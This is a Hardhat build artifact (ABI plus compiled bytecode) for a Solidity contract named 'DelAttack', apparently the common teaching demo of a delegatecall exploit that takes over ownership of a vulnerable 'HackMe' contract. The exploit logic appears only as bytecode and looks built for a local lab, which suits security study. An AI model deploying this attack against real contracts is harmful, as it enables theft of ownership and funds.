{
  "_format": "hh-sol-artifact-1",
  "contractName": "DelAttack",
  "sourceName": "contracts/delegatecall.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_hackMe",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_newOwner",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "hackMe",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "newOwner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610570380380610570833981810160405281019061003291906100cf565b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610154565b6000815190506100c98161013d565b92915050565b600080604083850312156100e257600080fd5b60006100f0858286016100ba565b9250506020610101858286016100ba565b9150509250929050565b60006101168261011d565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6101468161010b565b811461015157600080fd5b50565b61040d806101636000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806375efcec5146100465780639e5faafc14610064578063d4ee1d901461006e575b600080fd5b61004e61008c565b60405161005b919061031a565b60405180910390f35b61006c6100b0565b005b6100766101cc565b604051610083919061031a565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527fdd365b8b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161017a9190610303565b6000604051808303816000865af19150503d80600081146101b7576040519150601f19603f3d011682016040523d82523d6000602084013e6101bc565b606091505b505090506101c9816101f2565b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b610288816040516024016102069190610335565b6040516020818303038152906040527f32458eed000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505061028b565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b6102bd81610366565b82525050565b6102cc81610378565b82525050565b60006102dd82610350565b6102e7818561035b565b93506102f78185602086016103a4565b80840191505092915050565b600061030f82846102d2565b915081905092915050565b600060208201905061032f60008301846102b4565b92915050565b600060208201905061034a60008301846102c3565b92915050565b600081519050919050565b600081905092915050565b600061037182610384565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60005b838110156103c25780820151818401526020810190506103a7565b838111156103d1576000848401525b5050505056fea2646970667358221220ba1df1bdc320bb68651db3a82920c6e4a09bdb66f95d02eb3506d0a98a49774764736f6c63430008040033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}